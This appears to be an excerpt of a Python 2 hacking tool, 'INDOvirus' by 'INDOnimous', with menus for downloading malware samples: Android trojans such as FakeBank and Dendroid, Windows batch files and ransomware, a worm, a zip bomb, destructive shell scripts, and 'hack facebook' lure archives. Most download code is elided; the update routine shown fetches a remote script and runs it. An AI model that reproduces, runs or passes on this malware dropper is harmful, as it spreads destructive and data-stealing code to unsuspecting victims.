...
def banner():
    ...
    os.system('printf "==============?|INDOnimous-Homeland-Scurity|?==============\n===========================================================\n*\tBefikirlah sebagai seorang pemula   \t\t\t*\n*\tMaka dunia ini akan terbuka bagimu\t\t\t*\n*Learn  Security |Learn  Programming| Use  Linux \t\t*\n*Debugging Program | Write a Code| Share to your Community*\n*\tSaya hebat karena belajar,saya tahu karena membaca\t*\n*\tSaya mahir karena praktik ( try and error )\t\t*\n*\t\tTrust me, Knowledge Is King \t\t\t*\n\t\t[© Copyright INDOnimous 2019]\n***********************************************************\n" | lolcat ')
    os.system('printf "\t\t "\033[37m" [•••••||| INDOvirus |||•••••]\n\n" ')     
#print(""+R+"___ _   _ ____   ___        _")
#print("|_ _| \ | |  _ \ / _ \__   _(_)_ __ _   _ ___")
 #print(""+G+"| ||  \| | | | | | | \ \ / / | '__| | | / __|")
 #print(""+B+"| || |\  | |_| | |_| |\ V /| | |  | |_| \__ \")
#print(""+GR+"|___|_| \_|____/ \___/  \_/ |_|_|   \__,_|___/")

def about():
	print("\t\t"+B+"<<<<<<| "+R+"About Tool "+B+"|>>>>>>\n")
	print("\t"+G+"Made"+B+" with full"+R+" <3"+B+"\t\t")
	print("\tAuthor  : Hider5 and ★MR.B★\t\t\t")
	print("\tVersion : 2.1\t\t\t")
	print("\tTeam    : "+R+"LoOlzec Security And INDOnimous")
...
#################### START ANDROID
def Vandroid():
	print("\n"+R+"[================="+G+"|•|"+GR+"Hidangan Virus"+G+"|•|"+R+" ==================]")
	print(""+O+"["+GR+"1"+O+"] "+B+"Agent\t\t"+O+"["+GR+"15"+O+"] Elite\t\t["+GR+"29"+O+"] "+B+"Prasesfee")
	print(""+O+"["+GR+"2"+O+"] Badnews\t\t["+GR+"16"+O+"] "+B+"Omigo"+O+"\t\t["+GR+"30"+O+"] RecipeSmart")
	print(""+O+"["+GR+"3"+O+"] "+B+"Bios"+O+"\t\t["+GR+"17"+O+"] Opfake\t\t["+GR+"31"+O+"] "+B+"Romaticpos")
	print(""+O+"["+GR+"4"+O+"] BlatanSMS\t\t["+GR+"18"+O+"] "+B+"SmsWorker"+O+"\t\t["+GR+"32"+O+"] Statetss")
	print(""+O+"["+GR+"5"+O+"] "+B+"BrainTest"+O+"\t\t["+GR+"19"+O+"] Vietcon\t\t["+GR+"33"+O+"] "+B+"Thinking")
	print(""+O+"["+GR+"6"+O+"] Claco\t\t["+GR+"20"+O+"] "+B+"Candycorn"+O+"\t\t["+GR+"34"+O+"] Crd")
	print(""+O+"["+GR+"7"+O+"] "+B+"DropDialer"+O+"\t\t["+GR+"21"+O+"] Cat\t\t["+GR+"35"+O+"] "+B+"Dendroid")
	print(""+O+"["+GR+"8"+O+"] FakeBank\t\t["+GR+"22"+O+"] "+B+"Chistescortos"+O+"\t["+GR+"36"+O+"] Ds")
	print(""+O+"["+GR+"9"+O+"] "+B+"FakeCMCC"+O+"\t\t["+GR+"23"+O+"] Chistespicanticos\t["+GR+"37"+O+"] "+B+"Facebook")
	...
	print(""+R+"[==============="+G+"|•|"+GR+"Contak : #"+R+"INDO"+GR+"nimous"+G+"|•|"+R+"===============]")
	try:
		menu1 = input(""+G+"Pilih Nomernya > "+B+"")
		if menu1 == 1:#############done
			print(""+G+"")
			chunk_size = 1024
...
def Vmacosx():
	print("\n"+R+"[================="+G+"|•|"+GR+"Hidangan Virus"+G+"|•|"+R+" ==================]")
	print(""+O+"["+GR+"1"+O+"]"+B+" Trinoids")
	print(""+O+"["+GR+"2"+O+"] Nothing")
	print(""+O+"["+GR+"3"+O+"] "+B+"Back")
	print(""+R+"[=============="+G+"|•|"+GR+"Contak : #"+R+"INDO"+GR+"nimous"+G+"|•|"+R+"===============]")
	try:
		menu2 = input(""+G+"Pilih Nomernya > "+B+"")
		if menu2 == 1:
			print(""+G+"")
			chunk_size = 1024
...
def vpcwin():
	print("\n"+R+"[================="+G+"|•|"+GR+"Hidangan Virus"+G+"|•|"+R+" ==================]")
	print(""+O+"["+GR+"1"+O+"] "+B+"Ugly.bat"+O+"\t\t["+GR+"5"+O+"] Koce.bat\t["+GR+"9"+O+"] "+B+"Ransomeware")
	print(""+O+"["+GR+"2"+O+"] Sleepy.bat\t\t["+GR+"6"+O+"] "+B+"Cmd.bat"+O+"\t["+GR+"10"+O+"] Rip.bat")
	print(""+O+"["+GR+"3"+O+"] "+B+"Reg-eater.bat"+O+"\t["+GR+"7"+O+"] Capslock.vbs["+GR+"11"+O+"] "+B+"Back")
	print(""+O+"["+GR+"4"+O+"] Kuis.bat\t\t["+GR+"8"+O+"] "+B+"Alay.vbs")
	print(""+R+"[=============="+G+"|•|"+GR+"Contak : #"+R+"INDO"+GR+"nimous"+G+"|•|"+R+"===============]")

	try:	
		menu3 = input(""+B+"Input number > "+R+"")
		if menu3 == 1:
			print(""+G+"")
			chunk_size = 1024
...
def Vpdfautorunpc():
	print("\n"+R+"[================="+G+"|•|"+GR+"Hidangan Virus"+G+"|•|"+R+" ==================]")
	print(""+O+"["+GR+"1"+O+"] "+B+"How to hack facebook (ext: rar)")
	print(""+O+"["+GR+"2"+O+"] Hack facebook        (ext: rar)")
	print(""+O+"["+GR+"3"+O+"] "+B+"Back")
	print(""+R+"[=============="+G+"|•|"+GR+"Contak : #"+R+"INDO"+GR+"nimous"+G+"|•|"+R+"===============]")

	try:
		menu4 = input("Pilih Nomernya >"+G+" ")
		if menu4 == 1:
			print(""+G+"")
			chunk_size = 1024
...
def Vother():
	print("\n"+R+"[================="+G+"|•|"+GR+"Hidangan Virus"+G+"|•|"+R+" ==================]")
	print(""+O+"["+GR+"1"+O+"] "+B+"Worm.bat")
	print(""+O+"["+GR+"2"+O+"] Bomb.zip")
	print(""+O+"["+GR+"3"+O+"] "+B+"Back")
	print(""+R+"[=============="+G+"|•|"+GR+"Contak : #"+R+"INDO"+GR+"nimous"+G+"|•|"+R+"===============]")
	try:
		menu5 = input(""+R+"Pilih Nomernya > "+R+"")
		if menu5 == 1:
			print(""+G+"")
			chunk_size = 1024
		...
		print(""+G+"[!] This is not number")
		
###############Start Shell Virus		
def Shellvirus():
	print("\n"+R+"[================="+G+"|•|"+GR+"Hidangan Virus"+G+"|•|"+R+" ==================]")
	print(""+O+"["+GR+"1"+O+"] "+B+"Data-Eater.sh")
	print(""+O+"["+GR+"2"+O+"] Bootloop.sh")
	print(""+O+"["+GR+"3"+O+"] "+B+"Back")
	print(""+R+"[=============="+G+"|•|"+GR+"Contak : #"+R+"INDO"+GR+"nimous"+G+"|•|"+R+"===============]")
	
	try:
		menu6 = input(""+G+"Input number > "+GR+"")
		if menu6 == 1:
			print(""+B+"")
			chunk_size = 1024
...
def menu():
	print("\n"+R+"[================="+G+"|•|"+GR+"Hidangan Virus"+G+"|•|"+R+" ==================]")
	print(""+O+"["+GR+"1"+O+"] "+C+"Android\t\t"+O+"["+GR+"4"+O+"] Pdf Autorun PC\t["+GR+"7"+O+"] "+C+"Update ")
	print(""+O+"["+GR+"2"+O+"] Macosx\t\t["+GR+"5"+O+"] "+C+"Other\t\t"+O+"["+GR+"8"+O+"] About")
	print(""+O+"["+GR+"3"+O+"] "+C+"Windows\t\t"+O+"["+GR+"6"+O+"] Shell\t\t["+GR+"9"+O+"]"+C+" Exit")
	print(""+R+"[=============="+G+"|•|"+GR+"Contak : #"+R+"INDO"+GR+"nimous"+G+"|•|"+R+"===============]")
	try:
		menu = input("\n "+G+" [★Masukan Nomornya★]> "+B+" ")
		if menu == 1:
			os.system("clear")
			Vandroid()
		elif menu == 2:
			...
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/INDOnimous/INDOvirus/blob/master/INDOvirus.py?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'INDOvirus.py?raw=true' INDOvirus.py")
			os.system("python2 INDOvirus.py")
		elif menu == 8:
			os.system("clear")
			about()
		elif menu == 9:
